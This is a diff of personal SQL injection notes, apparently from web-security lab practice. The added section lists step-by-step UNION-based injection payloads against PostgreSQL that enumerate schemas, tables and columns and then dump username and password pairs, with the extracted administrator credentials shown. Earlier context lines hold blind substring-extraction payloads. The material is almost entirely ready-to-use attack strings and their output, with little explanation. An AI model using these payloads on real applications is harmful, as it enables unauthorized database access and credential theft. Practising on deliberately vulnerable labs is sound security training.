@@ -71,7 +71,7 @@ Selecting finally two values on the same query
 ```
 This last one returns user and password
 
-# MYSQL,POSTGRESQL,WINDOWS  #
+	# MYSQL,POSTGRESQL,WINDOWS  #
 
 To watch all the databases we can use this 
 
@@ -209,7 +209,6 @@ we filter the a
 BnrNOCeQTPXBkC9m' and (select substring(username,1,1) from users where username='administrator')='a
 ```
 ' union select (substring(schema_name ,1,1)='a') from information_schema.schemata -- -
-
 
 
 now the second character
@@ -441,3 +440,77 @@ In this case we need to use burpsuit with  a tool called "Hackventor" and is in 
 
 owasp zap
 could not register with interactsh server: interactsh.com: no address associated with hostname
+
+
+
+
+
+
+
+
+### Another assets out of scoope ###
+---------------------------------------------------------------------
+POSTGRESQL
+
+gifts ' union select schema_name , NULL from information_schema.schemata -- - (select dbs) public
+
+gifts' union select table_name, NULL from information_schema.tables  -- -
+
+gifts' union select table_name, NULL from information_schema.tables where table_schema = 'public' -- - (select tables)
+
+gifts' union select column_name, NULL from information_schema.columns where table_schema = 'public'  -- - (see all the columns)
+
+gifts' union select column_name, NULL from information_schema.columns where table_schema = 'public' and column_name='users' -- - (select just one)
+
+gifts' union select username,password from public.users -- - (selecting the data from public.users)
+
+
+administrator
+h3978x0jlltq0pumgw97
+
+---------------------------------------------------------------------
+
+POSTGRESQL
+
+
+gifts' union select NULL,schema_name from information_schema.schemata -- - (public is the db)
+
+gifts' union select NULL,table_name from information_schema.tables where table_schema='public' -- - (selecting tables from db='public')-we find "users"
+
+gifts' union select NULL,column_name from information_schema.columns where table_schema='public' -- - (selecting all the columns from the db='public')
+
+gifts' union select NULL,username ||':'||password from public.users -- -
+
+
+administrator:d829s8z2l1kvhp0f9x2p
+
+
+-----------------------------------------------------------------
+POSTGRESQL
+
+all tables
+Pets' union select table_name,NULL  from information_schema.tables -- -
+
+
+Select just the ones from the public
+
+pets' union select table_name, null from information_schema.tables where table_schema='public' -- -
+
+TABLE_NAME=users_pvvenn
+
+pets' union select column_name,null from information_schema.columns where table_schema='public' AND table_name='users_pvvenn' -- -
+
+COLUMNS=password_dlqybq,username_jdmbfk
+
+pets' union select password_dlqybq||':'|| username_jdmbfk,NULL from public.users_pvvenn -- -
+
+
+7c1ncv9i4tuebfehlr7h:administrator
+
+--------------------------------------------------------------
+
+
+Cookie: TrackingId
+(This cookie is procesed on MYSQL, so pay atention to this if you see it in the future)
+
+
